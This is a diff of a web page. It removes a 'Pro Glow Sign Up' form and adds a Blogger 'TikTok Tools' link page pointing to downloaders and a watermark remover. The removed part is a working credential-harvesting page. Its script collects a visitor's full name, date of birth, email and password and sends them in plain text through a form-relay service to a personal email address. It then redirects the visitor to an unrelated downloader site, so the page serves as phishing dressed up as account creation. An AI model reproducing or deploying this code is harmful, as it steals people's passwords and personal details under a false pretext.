@@ -1,232 +1,390 @@
+<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE html>
-<html lang="en">
+<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro Glow Sign Up</title>
-    <style>
-        /* Modern Font */
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
-        
-        body { 
-            font-family: 'Poppins', sans-serif;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            background-color: #0f172a; /* Deep Slate Background */
-            margin: 0; 
-            color: #f8fafc; 
-        }
+  <meta charset='UTF-8'/>
+  <meta content='width=device-width, initial-scale=1' name='viewport'/>
+  <b:include data='blog' name='all-head-content'/>
+  <title><data:blog.pageTitle/></title>
+  <link href='https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&amp;family=Rajdhani:wght@400;600&amp;display=swap' rel='stylesheet'/>
+  <b:skin><![CDATA[
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-        /* Professional Box with Soft Glow */
-        .glow-pro-box { 
-            background: #1e293b; 
-            padding: 40px 35px; 
-            border-radius: 16px; 
-            text-align: center; 
-            width: 85%;
-            max-width: 380px; 
-            /* Halka aur premium glow border par */
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            box-shadow: 0 0 25px rgba(56, 189, 248, 0.12), inset 0 0 10px rgba(56, 189, 248, 0.05);
-        }
+    :root {
+      --pink: #ff2d78;
+      --cyan: #00f7ff;
+      --purple: #b400ff;
+      --dark: #04000f;
+      --glass: rgba(255,255,255,0.04);
+    }
 
-        h2 { 
-            margin-bottom: 5px;
-            font-size: 28px;
-            font-weight: 600;
-            /* Text par blue/purple gradient */
-            background: linear-gradient(to right, #38bdf8, #818cf8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+    html, body {
+      min-height: 100vh;
+      background: var(--dark) !important;
+      font-family: 'Rajdhani', sans-serif;
+      overflow-x: hidden;
+    }
 
-        p {
-            font-size: 14px;
-            color: #94a3b8;
-            margin-bottom: 30px;
-        }
+    /* Hide all default Blogger elements */
+    #header-wrapper, #header, .header-wrapper,
+    #navbar, .navbar, #navBar,
+    #footer, .footer, #footer-wrapper,
+    #sidebar, .sidebar, #sidebar-wrapper,
+    .blog-pager, #blog-pager,
+    #Attribution1, .attribution,
+    .post-body, .post-title, .post-footer,
+    .post-header, .post-labels,
+    .share-buttons, .comments, #comments,
+    .widget-title, .widget-content,
+    #main-wrapper > .widget,
+    .blog-feeds { display: none !important; }
 
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
+    #outer-wrapper, #main-wrapper, #main,
+    .outer-wrapper, .main-wrapper, .main,
+    #content-wrapper, .content-wrapper {
+      background: transparent !important;
+      border: none !important;
+      padding: 0 !important;
+      margin: 0 auto !important;
+      max-width: 100% !important;
+      float: none !important;
+      width: 100% !important;
+      box-shadow: none !important;
+    }
 
-        label {
-            display: block;
-            font-size: 13px;
-            color: #cbd5e1;
-            margin-bottom: 8px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-        }
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0,247,255,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,247,255,0.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      animation: gridMove 20s linear infinite;
+      pointer-events: none;
+      z-index: 0;
+    }
 
-        input { 
-            width: 100%; 
-            padding: 14px 15px; 
-            box-sizing: border-box;
-            border: 1px solid #334155; 
-            background: #0f172a; 
-            color: #f8fafc; 
-            font-size: 15px;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
-        }
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 60% 50% at 20% 20%, rgba(180,0,255,0.15) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 40% at 80% 80%, rgba(255,45,120,0.15) 0%, transparent 60%),
+        radial-gradient(ellipse 40% 60% at 50% 50%, rgba(0,247,255,0.07) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
 
-        /* Input par click karne se soft glow aayega */
-        input:focus {
-            outline: none;
-            border-color: #38bdf8;
-            box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);
-        }
+    @keyframes gridMove {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(40px); }
+    }
 
-        input::placeholder {
-            color: #475569;
-        }
+    .tt-page {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
 
-        /* Glowing Button */
-        button { 
-            padding: 15px; 
-            background: linear-gradient(to right, #0284c7, #4f46e5); 
-            color: #ffffff; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-size: 16px;
-            font-weight: 600;
-            width: 100%;
-            margin-top: 10px;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);
-        }
+    .tt-container {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
 
-        button:hover {
-            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.5);
-            transform: translateY(-1px);
-        }
+    .tt-logo-box {
+      position: relative;
+      padding: 28px 48px;
+      margin-bottom: 10px;
+      text-align: center;
+      animation: fadeDown 0.6s ease both;
+    }
 
-        button:disabled {
-            background: #334155;
-            box-shadow: none;
-            cursor: not-allowed;
-            color: #94a3b8;
-        }
+    .tt-logo-box::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 16px;
+      border: 1.5px solid transparent;
+      background: linear-gradient(135deg, var(--cyan), var(--pink), var(--purple)) border-box;
+      -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: destination-out;
+      mask-composite: exclude;
+      animation: borderGlow 3s ease-in-out infinite alternate;
+    }
 
-        #loading-screen { 
-            display: none; 
-            text-align: center;
-        }
-        
-        .loader {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            border: 3px solid #334155;
-            border-top-color: #38bdf8;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
-        }
+    .tt-logo-box::after {
+      content: '';
+      position: absolute;
+      inset: -2px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, var(--cyan), var(--pink), var(--purple));
+      filter: blur(18px);
+      opacity: 0.25;
+      z-index: -1;
+      animation: borderGlow 3s ease-in-out infinite alternate;
+    }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+    @keyframes borderGlow {
+      0% { opacity: 0.2; filter: blur(14px); }
+      100% { opacity: 0.45; filter: blur(22px); }
+    }
+
+    .tt-logo-icon {
+      font-size: 2rem;
+      margin-bottom: 4px;
+      display: block;
+      animation: iconPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes iconPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    .tt-logo-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.6rem;
+      font-weight: 900;
+      letter-spacing: 0.08em;
+      background: linear-gradient(90deg, var(--cyan), #fff, var(--pink));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .tt-glow-text {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 0.7rem;
+      letter-spacing: 0.3em;
+      text-transform: uppercase;
+      color: var(--cyan);
+      margin-top: 6px;
+      animation: textFlicker 4s infinite;
+      filter: drop-shadow(0 0 6px var(--cyan));
+    }
+
+    @keyframes textFlicker {
+      0%, 94%, 96%, 100% { opacity: 1; }
+      95% { opacity: 0.5; }
+    }
+
+    .tt-btn {
+      position: relative;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      width: 100%;
+      padding: 15px 22px;
+      text-decoration: none !important;
+      color: white !important;
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 1rem;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      border-radius: 12px;
+      background: var(--glass);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.08);
+      overflow: hidden;
+      transition: all 0.35s cubic-bezier(0.23, 1, 0.32, 1);
+      cursor: pointer;
+      animation: slideIn 0.5s ease both;
+    }
+
+    .tt-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      transition: opacity 0.35s;
+      border-radius: 12px;
+    }
+
+    .tt-btn::after {
+      content: '';
+      position: absolute;
+      left: -60%;
+      top: -50%;
+      width: 30%;
+      height: 200%;
+      background: rgba(255,255,255,0.08);
+      transform: skewX(-20deg);
+      transition: left 0.6s ease;
+    }
+
+    .tt-btn:hover::after { left: 130%; }
+
+    .tt-btn:hover {
+      transform: translateY(-3px) scale(1.02);
+      border-color: transparent;
+    }
+
+    .tt-btn-1::before { background: linear-gradient(120deg, #ff0050, #ff2d78); }
+    .tt-btn-1 .tt-icon { color: #ff2d78; filter: drop-shadow(0 0 8px #ff2d78); }
+    .tt-btn-1:hover { box-shadow: 0 0 24px rgba(255,45,120,0.5), 0 8px 32px rgba(255,45,120,0.2); border-color: rgba(255,45,120,0.6); }
+    .tt-btn-1:hover::before { opacity: 0.15; }
+
+    .tt-btn-2::before { background: linear-gradient(120deg, #f5003e, #ff6a00); }
+    .tt-btn-2 .tt-icon { color: #ff6a00; filter: drop-shadow(0 0 8px #ff6a00); }
+    .tt-btn-2:hover { box-shadow: 0 0 24px rgba(255,106,0,0.5), 0 8px 32px rgba(255,106,0,0.2); border-color: rgba(255,106,0,0.6); }
+    .tt-btn-2:hover::before { opacity: 0.15; }
+
+    .tt-btn-3::before { background: linear-gradient(120deg, #00c6ff, #0072ff); }
+    .tt-btn-3 .tt-icon { color: #00f7ff; filter: drop-shadow(0 0 8px #00f7ff); }
+    .tt-btn-3:hover { box-shadow: 0 0 24px rgba(0,247,255,0.5), 0 8px 32px rgba(0,247,255,0.2); border-color: rgba(0,247,255,0.6); }
+    .tt-btn-3:hover::before { opacity: 0.15; }
+
+    .tt-btn-4::before { background: linear-gradient(120deg, #b400ff, #7000ff); }
+    .tt-btn-4 .tt-icon { color: #d466ff; filter: drop-shadow(0 0 8px #d466ff); }
+    .tt-btn-4:hover { box-shadow: 0 0 24px rgba(180,0,255,0.5), 0 8px 32px rgba(180,0,255,0.2); border-color: rgba(180,0,255,0.6); }
+    .tt-btn-4:hover::before { opacity: 0.15; }
+
+    .tt-btn-5::before { background: linear-gradient(120deg, #00ff87, #00b4ff); }
+    .tt-btn-5 .tt-icon { color: #00ff87; filter: drop-shadow(0 0 8px #00ff87); }
+    .tt-btn-5:hover { box-shadow: 0 0 24px rgba(0,255,135,0.5), 0 8px 32px rgba(0,255,135,0.2); border-color: rgba(0,255,135,0.6); }
+    .tt-btn-5:hover::before { opacity: 0.15; }
+
+    .tt-icon { font-size: 1.3rem; flex-shrink: 0; transition: transform 0.3s ease; }
+    .tt-btn:hover .tt-icon { transform: scale(1.2) rotate(-5deg); }
+    .tt-label { flex: 1; text-align: left; }
+
+    .tt-arrow {
+      font-size: 1rem;
+      opacity: 0;
+      transform: translateX(-8px);
+      transition: all 0.3s ease;
+      color: rgba(255,255,255,0.6);
+    }
+
+    .tt-btn:hover .tt-arrow { opacity: 1; transform: translateX(0); }
+
+    .tt-btn:nth-child(1) { animation-delay: 0.1s; }
+    .tt-btn:nth-child(2) { animation-delay: 0.2s; }
+    .tt-btn:nth-child(3) { animation-delay: 0.3s; }
+    .tt-btn:nth-child(4) { animation-delay: 0.4s; }
+    .tt-btn:nth-child(5) { animation-delay: 0.5s; }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .tt-particle {
+      position: fixed;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 0;
+      animation: floatUp linear infinite;
+    }
+
+    @keyframes floatUp {
+      0% { transform: translateY(100vh) scale(0); opacity: 0; }
+      10% { opacity: 0.6; }
+      90% { opacity: 0.3; }
+      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+    }
+  ]]></b:skin>
 </head>
+
 <body>
 
-    <!-- Loading Screen -->
-    <div id="loading-screen">
-        <div class="loader"></div>
-        <p style="color: #cbd5e1; font-size: 15px;">Authenticating...</p>
+  <script type='text/javascript'>
+  //<![CDATA[
+    (function() {
+      var colors = ['#ff2d78','#00f7ff','#b400ff','#ff6a00','#00ff87'];
+      for (var i = 0; i < 18; i++) {
+        var p = document.createElement('div');
+        p.className = 'tt-particle';
+        var size = Math.random() * 4 + 2;
+        p.style.cssText =
+          'width:' + size + 'px;' +
+          'height:' + size + 'px;' +
+          'background:' + colors[Math.floor(Math.random() * colors.length)] + ';' +
+          'left:' + (Math.random() * 100) + 'vw;' +
+          'animation-duration:' + (Math.random() * 12 + 8) + 's;' +
+          'animation-delay:' + (Math.random() * 10) + 's;' +
+          'filter:blur(1px);' +
+          'box-shadow:0 0 6px currentColor;';
+        document.body.appendChild(p);
+      }
+    })();
+  //]]>
+  </script>
+
+  <div class='tt-page'>
+    <div class='tt-container'>
+
+      <div class='tt-logo-box'>
+        <span class='tt-logo-icon'>&#9835;</span>
+        <div class='tt-logo-title'>TikTok Tools</div>
+        <div class='tt-glow-text'>&#9889; All-in-one creator kit &#9889;</div>
+      </div>
+
+      <a class='tt-btn tt-btn-1' href='YOUR_YOUTUBE_LINK' target='_blank'>
+        <span class='tt-icon'>&#9654;</span>
+        <span class='tt-label'>YouTube Downloader</span>
+        <span class='tt-arrow'>&#8594;</span>
+      </a>
+
+      <a class='tt-btn tt-btn-2' href='https://sssinstagram.com/en1' target='_blank'>
+        <span class='tt-icon'>&#9672;</span>
+        <span class='tt-label'>Instagram Downloader</span>
+        <span class='tt-arrow'>&#8594;</span>
+      </a>
+
+      <a class='tt-btn tt-btn-3' href='YOUR_WATERMARK_LINK' target='_blank'>
+        <span class='tt-icon'>&#10022;</span>
+        <span class='tt-label'>Watermark Remover</span>
+        <span class='tt-arrow'>&#8594;</span>
+      </a>
+
+      <a class='tt-btn tt-btn-4' href='https://viralhook-ai-lyart.vercel.app' target='_blank'>
+        <span class='tt-icon'>&#10023;</span>
+        <span class='tt-label'>Magic Viral Title &amp; Hashtags</span>
+        <span class='tt-arrow'>&#8594;</span>
+      </a>
+
+      <a class='tt-btn tt-btn-5' href='https://h4k3r-ai.vercel.app' target='_blank'>
+        <span class='tt-icon'>&#9670;</span>
+        <span class='tt-label'>AI Video Generator</span>
+        <span class='tt-arrow'>&#8594;</span>
+      </a>
+
     </div>
+  </div>
 
-    <!-- Professional Soft Glow Form -->
-    <div class="glow-pro-box" id="signup-box">
-        <h2>Create Account</h2>
-        <p>Enter your details to get started</p>
-        
-        <div class="input-group">
-            <label>Full Name</label>
-            <input type="text" id="userFullName" placeholder="" required />
-        </div>
+  <b:section class='main' id='main' maxwidgets='1' showaddelement='no'>
+    <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'>
+      <b:widget-settings>
+        <b:widget-setting name='showShareButtons'>false</b:widget-setting>
+        <b:widget-setting name='showCommentLink'>false</b:widget-setting>
+        <b:widget-setting name='showAuthor'>false</b:widget-setting>
+        <b:widget-setting name='showTimestamp'>false</b:widget-setting>
+        <b:widget-setting name='showLabel'>false</b:widget-setting>
+      </b:widget-settings>
+      <b:includable id='main' var='top'>
+      </b:includable>
+    </b:widget>
+  </b:section>
 
-        <div class="input-group">
-            <label>Date of Birth</label>
-            <input type="text" id="userDOB" placeholder="DD/MM/YYYY" required />
-        </div>
-
-        <div class="input-group">
-            <label>Email Address</label>
-            <input type="email" id="userEmail" placeholder="name@example.com" required />
-        </div>
-
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="userPass" placeholder="••••••••" required />
-        </div>
-        
-        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
-    </div>
-
-    <script>
-        // --- CREDENTIALS ---
-        const adminEmail = "mrpinto1433@gmail.com"; 
-        const targetLink = "https://allinonedown.weebly.com"; 
-
-        // Auto-check on Page Load
-        window.onload = function() {
-            if (localStorage.getItem("app_user_verified") === "true") {
-                showLoading();
-                window.location.href = targetLink;
-            }
-        };
-
-        function showLoading() {
-            document.getElementById("signup-box").style.display = "none";
-            document.getElementById("loading-screen").style.display = "block";
-        }
-
-        function handleSignup() {
-            const fullName = document.getElementById("userFullName").value;
-            const dob = document.getElementById("userDOB").value;
-            const email = document.getElementById("userEmail").value;
-            const pass = document.getElementById("userPass").value;
-            const btn = document.getElementById("submitBtn");
-
-            if(!fullName || !dob || !email || !pass) {
-                alert("Please fill all the details to continue!");
-                return;
-            }
-
-            btn.innerText = "Processing...";
-            btn.disabled = true;
-
-            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "Full Name": fullName,
-                    "Date of Birth": dob,
-                    "Email": email,
-                    "Password": pass,
-                    "_subject": "New App Registration!"
-                })
-            })
-            .then(() => {
-                localStorage.setItem("app_user_verified", "true");
-                showLoading();
-                window.location.href = targetLink;
-            })
-            .catch(() => {
-                alert("Network error! Please check your connection.");
-                btn.innerText = "Sign Up";
-                btn.disabled = false;
-            });
-        }
-    </script>
 </body>
 </html>
